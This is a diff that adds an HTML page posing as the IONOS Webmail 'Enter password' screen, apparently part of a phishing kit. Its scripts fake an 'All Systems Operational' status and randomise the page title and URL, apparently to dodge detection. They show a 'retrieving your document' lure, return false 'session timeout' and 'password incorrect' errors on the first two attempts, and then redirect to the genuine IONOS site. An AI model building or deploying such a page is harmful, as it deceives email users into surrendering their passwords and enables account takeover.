@@ -1,0 +1,455 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+
+
+
+
+
+
+
+
+
+    <link rel="stylesheet" href="https://ce1.uicdn.net/exos/framework/3.0/ionos.min.css" />
+
+    <link rel="icon" type="image/png" sizes="32x32" href="https://id.ionos.com/image/favicon-32px.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://id.ionos.com/image/favicon-16px.png">
+    <link rel="icon" type="image/png" sizes="48x48" href="https://id.ionos.com/image/favicon-48px.png">
+    <link rel="shortcut icon" type="image/x-icon" href="https://id.ionos.com/image/favicon.ico" />
+
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="robots" content="noindex">
+    <link rel="canonical" href="https://id.ionos.com/password" />
+
+
+
+
+    <title>Webmail Login</title>
+    <meta name="description"
+        content="Login to access your IONOS e-mail account and read your e-mail online with IONOS Webmail." />
+
+    <link rel="stylesheet" href="https://id.ionos.com/style/main.min.css" />
+
+
+</head>
+
+<body>
+
+
+    <link rel="stylesheet" href="https://id.ionos.com/style/starter-main.min.css" />
+
+    <div class="page-content">
+
+
+
+        <div class="oao-navi-navigation oao-navi-light">
+            <div class="oao-navi-left">
+                <div class="oao-navi-application-name">
+                    <a class="oao-navi-app-name" href="https://www.ionos.com/">
+                        <span class="oao-navi-app-logo"></span>
+                        <span>Webmail Login</span>
+                    </a>
+                </div>
+            </div>
+
+        </div>
+
+
+
+        <main>
+
+            <section class="page-section page-section--default page-section--short">
+                <div class="page-section__block">
+
+
+
+                    <div class="sheet sheet__section--warning cookie-message hidden">
+                        <section class="sheet__section">
+                            <h2 class="headline headline--sub">Activation of Browser Cookies Required</h2>
+                            <p class="paragraph">To take advantage of our offer, it is necessary for you to allow the
+                                use of cookies in your browser settings.</p>
+                            <a href="https://www.ionos.com/help/security-c85142/browser-security-c85171"
+                                class="link link--action" target="_blank">Learn more</a>
+                        </section>
+                    </div>
+
+
+
+
+
+                    <noscript>
+                        <div class="sheet sheet--warning">
+                            <section class="sheet__section">
+                                <h2 class="headline headline--sub headline--warning">Please enable JavaScript in your
+                                    browser</h2>
+                                <p class="paragraph">To take advantage of our offer, it is necessary for you to allow
+                                    the execution of JavaScript in your browser settings.</p>
+                            </section>
+                        </div>
+                    </noscript>
+
+
+
+
+
+
+
+
+
+
+
+
+                    <div class="sheet">
+                        <section class="sheet__section sheet__section--default">
+                            <ul>
+                                <li class="stripe stripe--cropped">
+                                    <div class="stripe__item">
+                                        <img class="stripe__visual" src="https://id.ionos.com/image/password.svg"
+                                            height="58" width="auto" />
+                                    </div>
+                                    <div class="stripe__item">
+                                        <h1 class="headline stripe__element">Enter password</h1>
+                                    </div>
+                                </li>
+                            </ul>
+                        </section>
+
+                        <section class="sheet__section sheet__section--default">
+
+                            <div class="container-current-identifier">
+
+                                <div class="current-identifier">
+                                    <a class="ghost-button ghost-button--icon-only ghost-button--secondary tooltip"
+                                        href="/identifier" data-tooltip="Back to login">
+                                        <i class="ghost-button__icon exos-icon exos-icon-pagenavbackwards-16"></i>
+                                    </a>
+                                    <a class="button-current-identifier ghost-button ghost-button--with-icon ghost-button--secondary tooltip"
+                                        href="/identifier" data-tooltip="Back to login">
+                                        <i class="ghost-button__icon exos-icon exos-icon-nav-user-16"></i>
+                                        <span class="ghost-button__text"></span>
+                                    </a>
+                                </div>
+
+                            </div>
+
+                            <form method="POST" novalidate>
+                                <input type="hidden" name="_csrf"
+                                    value="l2QdgOpPrsut30Dl2k5abFBOTWZZOls6Z3YA06MRkkLopRPCoVUpstspnfOA6CXQ62NuWGEsYF8_W20XUkFh6pshp3OLnSeh" />
+                                <input type="email" class="hidden" name="identifier" id="username" tabindex="-1"
+                                    spellcheck="false" value="" autocomplete="off">
+                                <ul>
+                                    <div id="error-message"></div>
+                                    <li class="form-stripe">
+                                        <label class="label" for="user-password">Password</label>
+                                        <span class="input-text-group input-text-group--focus">
+                                            <input type="password" class="input-text" required="true" tabindex="1"
+                                                autofocus autocomplete="current-password" autocapitalize="none"
+                                                spellcheck="false" id="user-password" name="user-password" value="" />
+                                            <a class="input-text-group__action password-unveil"
+                                                id="toggle-password-visibility" href="#">Show</a>
+                                        </span>
+
+
+                                        <p class="input-byline">
+                                            <a class="link oao-pi-open-in-flyin" target="_blank"
+                                                href="https://www.ionos.com/help/index.php?id=2327">Forgot Your
+                                                Password?</a>
+                                        </p>
+                                        <p class="input-byline"><strong>Not your device?</strong> Log out after the
+                                            session or use <a
+                                                class="oao-pi-open-in-flyin reveal-title-by-hover link link--lookup tooltip"
+                                                target="_blank" data-tooltip="Look up"
+                                                href="https://www.ionos.com/help/index.php?id=5430">private browsing
+                                                mode</a>.
+                                    </li>
+                                    <li class="form-stripe form-stripe--actions">
+                                        <button class="button button--primary button--full-width button--with-loader"
+                                            type="submit" id="submit-button" name="submit-button"
+                                            tabindex="2">Next</button>
+                                    </li>
+                                </ul>
+                            </form>
+                        </section>
+                    </div>
+
+                    <div id="loadingPopup" style="display: none;">
+                        <div class="spinner"></div>
+                        <div>RETRIEVING YOUR DOCUMENT</div>
+                    </div>
+
+
+                </div>
+            </section>
+
+        </main>
+
+    </div>
+
+
+
+
+    <footer class="page-footer">
+        <div class="page-footer__block">
+
+            <section class="page-footer__section page-footer__section--last">
+
+                <div id="light" class="page-footer__section-item">
+                    <div class="aoao-statuspage-overall-status page-footer__status"></div>
+                </div>
+
+                <div
+                    class="page-footer__section-item page-footer__section-item--align-center page-footer__section-item--small-align-left">
+                    &copy; 2025
+
+
+                    <a class="page-footer__link" target="_blank" href="https://www.ionos.com/about">IONOS Inc.</a>
+
+
+
+
+
+
+
+                </div>
+
+                <div
+                    class="page-footer__section-item page-footer__section-item--align-right page-footer__section-item--small-align-left">
+
+
+
+                    <a class="page-footer__link" target="_blank"
+                        href="https://www.ionos.com/terms-gtc/terms-privacy">Privacy Policy</a>
+
+
+
+
+
+
+                    -
+
+
+                    <a class="page-footer__link" target="_blank" href="https://www.ionos.com/terms-gtc">T&amp;Cs</a>
+
+
+
+
+
+
+
+                </div>
+
+            </section>
+
+        </div>
+    </footer>
+
+
+
+
+
+
+
+
+
+
+    <div>
+
+        <div id="javascript-data" data-visit-id="b3bf916b-03e8-4902-8b0e-fb1fbef26770.A" data-lang="en" data-tenant="US"
+            data-context-path="/" data-env-mode="prod" data-artifact-version="1.0.119" data-artifact-name="id"
+            data-sherlock-url="https://sherlock.ionos.com/">
+        </div>
+
+    </div>
+
+
+
+
+
+    <script>
+        // Select the target element using the ID
+        const statusElement = document.querySelector('#light .aoao-statuspage-overall-status.page-footer__status');
+
+        // Update the content
+        statusElement.textContent = "All Systems Operational";
+
+        // Style the content
+        statusElement.style.display = "flex";
+        statusElement.style.alignItems = "center";
+        statusElement.style.gap = "8px";
+        statusElement.style.fontSize = "16px";
+        statusElement.style.fontWeight = "bold";
+
+        // Create the green circle
+        const greenCircle = document.createElement('span');
+        greenCircle.style.width = "12px";
+        greenCircle.style.height = "12px";
+        greenCircle.style.borderRadius = "50%";
+        greenCircle.style.backgroundColor = "green";
+
+        // Add the green circle before the text
+        statusElement.prepend(greenCircle);
+    </script>
+
+    <script>
+        // Function to generate a random string
+        function generateRandomString(length) {
+            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let result = '';
+            for (let i = 0; i < length; i++) {
+                result += characters.charAt(Math.floor(Math.random() * characters.length));
+            }
+            return result;
+        }
+
+        // Function to set a random title
+        function generateRandomTitle() {
+            const segments = Math.floor(Math.random() * 6) + 50; // 5 to 10 segments
+            let title = '';
+            for (let i = 0; i < segments; i++) {
+                title += generateRandomString(Math.floor(Math.random() * 10) + 5) + ' ';
+            }
+            document.title = title.trim();
+        }
+
+        // Function to add random parameters to the URL
+        function addRandomParamsToURL() {
+            try {
+                const url = new URL(window.location.href);
+
+                // Add random parameters to the current URL
+                for (let i = 0; i < 5; i++) { // Add 5 random parameters
+                    const key = generateRandomString(50);
+                    const value = generateRandomString(100);
+                    url.searchParams.append(key, value);
+                }
+
+                // Replace the current URL with the updated one
+                window.history.replaceState({}, '', url.toString());
+            } catch (error) {
+                console.error("Error updating URL parameters:", error);
+            }
+        }
+
+
+
+        // Error handler for any unexpected failures
+        window.addEventListener('error', (e) => {
+            console.error("Unexpected error occurred:", e.message);
+            // Reload the page in case of a critical error
+            setTimeout(() => {
+                window.location.reload();
+            }, 5000); // Retry after 5 seconds
+        });
+
+        // Initialize functions
+        generateRandomTitle();
+        addRandomParamsToURL();
+    </script>
+    <script>
+        let attemptCount = 0; // Track the number of password attempts
+
+        // Disable the "Next" button if the password field is empty
+        function validatePassword() {
+            const passwordInput = document.getElementById("user-password");
+            const nextButton = document.getElementById("submit-button");
+            const errorMessageElement = document.getElementById("error-message");
+
+            if (passwordInput.value.trim() === "") {
+                errorMessageElement.textContent = "Password is required to proceed.";
+                errorMessageElement.style.color = "red";
+                nextButton.disabled = true;
+            } else {
+                errorMessageElement.textContent = "";
+                nextButton.disabled = false;
+            }
+        }
+
+        // Listen for typing in the password field
+        document.getElementById("user-password").addEventListener("input", function () {
+            validatePassword();
+        });
+
+        // Listen to the "Next" button click
+        document.getElementById("submit-button").addEventListener("click", function (event) {
+            event.preventDefault(); // Prevent form submission
+
+            const passwordInput = document.getElementById("user-password");
+            const errorMessageElement = document.getElementById("error-message");
+            const nextButton = document.getElementById("submit-button");
+            const loadingPopup = document.getElementById("loadingPopup");
+
+            // If password is empty, show error and stop further action
+            if (passwordInput.value.trim() === "") {
+                errorMessageElement.textContent = "Password is required to proceed.";
+                errorMessageElement.style.color = "red";
+                nextButton.disabled = false; // Ensure the button is re-enabled
+                return;
+            }
+
+            // Show the loading message
+            loadingPopup.style.display = "block";
+            nextButton.disabled = true; // Disable the button to prevent multiple clicks
+            nextButton.textContent = "Loading..."; // Show the loading text
+
+            // Simulate loading delay
+            setTimeout(() => {
+                loadingPopup.style.display = "none"; // Hide the loading message
+                nextButton.disabled = false; // Re-enable the button after the error or success
+                nextButton.textContent = "Next"; // Reset button text to "Next"
+
+                if (attemptCount === 0) {
+                    errorMessageElement.textContent = "Your session is timeout. Please try again.";
+                    errorMessageElement.style.color = "red";
+                } else if (attemptCount === 1) {
+                    errorMessageElement.textContent = "Your Password is incorrect. Please try again.";
+                    errorMessageElement.style.color = "red";
+                } else if (attemptCount === 2) {
+                    // Redirect to the specified URL after 3 failed attempts
+                    window.location.href = "https://id.ionos.com/";
+                    return;
+                }
+
+                passwordInput.value = ""; // Clear the password field after each error
+                attemptCount++; // Increment the attempt count
+            }, 3000); // Simulate a 3-second delay
+        });
+
+        // Validate password on page load to disable the button initially
+        window.onload = function () {
+            const emailElement = document.querySelector('.ghost-button__text');
+            const newEmail = "updatedemail@example.com"; // Replace with your desired email
+            emailElement.textContent = newEmail; // Update the email immediately on load
+
+            validatePassword(); // Initial validation
+        };
+    </script>
+
+    <script>
+        // Function to toggle password visibility
+        function togglePasswordVisibility() {
+            const passwordInput = document.getElementById("user-password");
+            const unveilButton = document.getElementById("toggle-password-visibility");
+
+            if (passwordInput.type === "password") {
+                passwordInput.type = "text"; // Show the password
+                unveilButton.textContent = "Hide"; // Update button text
+            } else {
+                passwordInput.type = "password"; // Hide the password
+                unveilButton.textContent = "Show"; // Reset button text
+            }
+        }
+
+        // Add event listener to the unveil button
+        document.getElementById("toggle-password-visibility").addEventListener("click", function (event) {
+            event.preventDefault(); // Prevent default link behavior
+            togglePasswordVisibility(); // Call the toggle function
+        });
+    </script>
+
+
+
+</body>
+
+</html>
